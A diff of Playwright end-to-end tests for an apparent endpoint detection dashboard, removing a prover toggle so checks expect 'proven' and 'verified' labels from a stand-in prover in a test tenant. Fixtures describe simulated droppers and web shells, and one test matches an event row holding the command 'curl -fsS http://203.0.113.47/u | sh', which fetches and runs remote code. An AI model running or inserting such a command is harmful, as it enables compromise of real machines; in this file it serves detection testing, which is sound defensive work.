@@ -8,7 +8,6 @@ import {
   mapView,
   openHost,
   pinch,
-  PROVING,
   record,
   settle,
   signIn,
@@ -182,7 +181,7 @@ test('investigate: follow a dropper through what its findings opened, to the lin
   await expect(details.getByText('Office application started a script host')).toBeVisible()
   await expect(details.getByText('T1218.011')).toBeVisible()
   const told = details.locator('[data-finding="office-child"] [data-finding-proof]')
-  await expect(told).toContainText('no prover')
+  await expect(told).toContainText('proven')
   await expect(told).toContainText(/window \d+/)
   await expect(told).toContainText(/opened by this match: trigger #\d+, context #\d+/)
   await expectNothingCutOff(page, '[aria-label=Details]', '[data-finding]')
@@ -371,12 +370,12 @@ test('sealed: a busy build server shows how much it holds and nothing of it, and
   await expect(chain).toContainText('Committed')
   await expect(chain.locator('[data-window]').first()).toHaveAttribute('aria-label', /opens an epoch/)
   expect(await chain.locator('[data-window]').count()).toBeGreaterThan(20)
-  await expect(chain.locator('[data-proof="none"]').first()).toBeVisible()
+  await expect(chain.locator('[data-proof="verified"]').first()).toBeVisible()
   await chain.locator('[data-window="0"]').click()
   await expect(page).toHaveURL(/[?&]win=0/)
   const first = chain.getByRole('region', { name: 'Window 0' })
   await expect(first).toContainText('opens epoch 1')
-  await expect(first).toContainText('no prover')
+  await expect(first).toContainText('proven')
   await expect(first.locator('[data-sealed-event="sealed"]').first()).toContainText('sealed')
   await expect(first.locator('[data-sealed-event="opened"]')).toHaveCount(0)
   await expect(first.getByRole('link')).toHaveCount(0)
@@ -526,7 +525,7 @@ test('linux: a web shell that plants a cron job, told by what its findings opene
   const finding = details.getByRole('button', { name: /^Autostart item downloads and runs code/ })
   await expect(finding).toBeVisible()
   await expect(details.getByRole('button', { name: /^Server process started a shell/ })).toBeVisible()
-  await expect(details.locator('[data-finding="server-child"] [data-finding-proof]')).toContainText(PROVING ? 'proven' : 'no prover')
+  await expect(details.locator('[data-finding="server-child"] [data-finding-proof]')).toContainText('proven')
   await settle(page, 800)
   await run.shot('web-shell')
 
@@ -595,18 +594,18 @@ test('chain: from a finding to its window, the events it opened and the plaintex
   await expect(chain.getByRole('button', { name: 'Copy head' })).toBeVisible()
   const cells = chain.locator('[data-window]')
   expect(await cells.count()).toBeGreaterThan(20)
-  expect(await chain.locator(`[data-proof="${PROVING ? 'verified' : 'none'}"]`).count()).toBeGreaterThan(20)
-  await expect(chain).toContainText(PROVING ? /verified \d+/ : /no prover \d+/)
-  await expect(chain.getByText('Last proven').locator('..')).toContainText(PROVING ? /window \d+/ : 'none')
+  expect(await chain.locator('[data-proof="verified"]').count()).toBeGreaterThan(20)
+  await expect(chain).toContainText(/verified \d+/)
+  await expect(chain.getByText('Last proven').locator('..')).toContainText(/window \d+/)
   await expect(chain.locator('[data-window][aria-pressed="true"]')).toHaveCount(1)
 
   const window = chain.getByRole('region', { name: /^Window \d+$/ })
-  await expect(window).toContainText(PROVING ? 'proven' : 'no prover')
+  await expect(window).toContainText('proven')
   for (const part of ['holds', 'epoch', 'received', 'follows', 'root', 'head']) await expect(window.getByText(part, { exact: true })).toBeVisible()
   const releases = window.getByRole('list', { name: 'Releases' }).getByRole('listitem')
   await expect(releases.filter({ hasText: 'Server process started a shell' })).toContainText(/high · T1505\.003/)
   await expect(releases.filter({ hasText: 'Server process started a shell' })).toContainText(/opened #\d+, #\d+/)
-  await expect(releases.filter({ hasText: 'Download piped into execution' })).toContainText(PROVING ? 'proven' : 'no prover')
+  await expect(releases.filter({ hasText: 'Download piped into execution' })).toContainText('proven')
   await expect(window.locator('[data-sealed-event="opened"]')).toHaveCount(1)
   await expectNothingCutOff(page, '[aria-label="Commitment chain"]', '[data-sealed-event], [data-release]')
   await window.scrollIntoViewIfNeeded()
@@ -628,7 +627,7 @@ test('chain: from a finding to its window, the events it opened and the plaintex
   const shell = held.locator('[data-sealed-row="opened"]').filter({ hasText: 'curl -fsS http://203.0.113.47/u | sh' })
   await shell.scrollIntoViewIfNeeded()
   await expect(shell).toContainText('process')
-  await expect(shell.locator('[title]').last()).toHaveAttribute('title', PROVING ? /A proof shows the rules ran/ : /has no prover/)
+  await expect(shell.locator('[title]').last()).toHaveAttribute('title', /A proof shows the rules ran/)
   await expectNothingCutOff(page, '[role=table][aria-label="Committed events"]', '[data-sealed-row]')
   await settle(page)
   await run.shot('sealed-and-opened-in-chain-order')
@@ -650,7 +649,7 @@ test('chain: from a finding to its window, the events it opened and the plaintex
   await page.getByRole('region', { name: 'Events over time' }).getByRole('button', { name: /^Incident/ }).click()
   await page.getByLabel('Filter events').fill('Server process started a shell')
   await page.locator('[data-event="detection"]').first().click()
-  await expect(opened.locator('[data-finding-proof]')).toContainText(PROVING ? 'proven' : 'no prover')
+  await expect(opened.locator('[data-finding-proof]')).toContainText('proven')
   await expect(opened.locator('[data-finding-proof]')).toContainText(/window \d+/)
   await settle(page)
   await run.shot('a-finding-in-the-event-list')
@@ -658,7 +657,6 @@ test('chain: from a finding to its window, the events it opened and the plaintex
 })
 
 test('dishonest: an endpoint that proved a match it did not report', async ({ page }, info) => {
-  test.skip(!PROVING, 'needs the prover: make guest && make prover')
   const run = record(page, info, 'dishonest')
   await signIn(page)
   await openHost(page, WITHHOLDS)
@@ -714,15 +712,12 @@ test('rules: the page that says what can open data', async ({ page }, info) => {
   await expect(row('flagged-process-ended')).toContainText('follow-up')
   await expect(row('flagged-process-ended').getByRole('cell').nth(1)).toHaveText('')
   await expect(row('flagged-process-ended')).toContainText('end of the process and the process')
-  await expect(row('preload-added').getByRole('cell').last()).toHaveText('0')
+  await expect(row('preload-added').getByRole('cell').last()).toHaveText('1')
 
   const programs = page.getByRole('region', { name: 'Accepted rule programs' })
-  if (PROVING) {
-    await expect(programs.locator('[data-image-id]')).toHaveCount(1)
-    await expect(programs.getByRole('button', { name: 'Copy image ID' })).toBeVisible()
-  } else {
-    await expect(programs.getByRole('status')).toContainText('accepts no rule program')
-  }
+  await expect(programs.locator('[data-stand-in]')).toContainText('prove nothing')
+  await expect(programs.locator('[data-image-id]')).toHaveCount(0)
+  await expect(page.locator('[data-test-tenant]')).toHaveText('Test tenant')
   await expectNothingCutOff(page, '[role=table][aria-label=Rules]', '[data-rule]')
   await settle(page)
   await run.shot('rules')
@@ -737,12 +732,10 @@ test('events: the fleet totals, lanes of what was reported, and a drag that cuts
   await expect(holds.locator('[data-fleet="sealed"]')).toContainText(/\d,\d{3}\s*events sealed by 194 endpoints/)
   await expect(holds.locator('[data-fleet="opened"]')).toContainText(/\d+\s*opened by rule matches, 0\.\d+% of what the server holds/)
   await expect(holds.locator('[data-fleet="windows"]')).toContainText(/\d,\d{3} windows/)
-  await expect(holds.locator('[data-fleet="windows"]')).toContainText(/no prover \d,\d{3}/)
+  await expect(holds.locator('[data-fleet="windows"]')).toContainText(/no prover \d+/)
   await expect(holds.locator('[data-fleet="windows"]')).toContainText('1 gap')
-  if (PROVING) {
-    await expect(holds.locator('[data-fleet="windows"]')).toContainText(/verified \d+/)
-    await expect(holds.locator('[data-fleet="windows"]')).toContainText(/mismatch \d+/)
-  }
+  await expect(holds.locator('[data-fleet="windows"]')).toContainText(/verified \d,\d{3}/)
+  await expect(holds.locator('[data-fleet="windows"]')).toContainText(/mismatch \d+/)
 
   const over = page.getByRole('region', { name: 'Events over time' })
   const lanes = page.getByTestId('event-lanes')
@@ -805,7 +798,7 @@ test('agent: the pulse shows where an endpoint went quiet, over a chain that kep
   await expect(stopped).toContainText('The agent said its service was being stopped while the system stayed up.')
   await page.getByRole('radio', { name: 'Agent' }).click()
   const last = page.getByRole('region', { name: 'Commitment chain' }).locator('[data-window]').last()
-  await expect(last).toHaveAttribute('aria-label', /proof no prover/)
+  await expect(last).toHaveAttribute('aria-label', /proof verified/)
   await settle(page)
   await run.shot('stopped-with-its-last-window-delivered')
   run.finish()
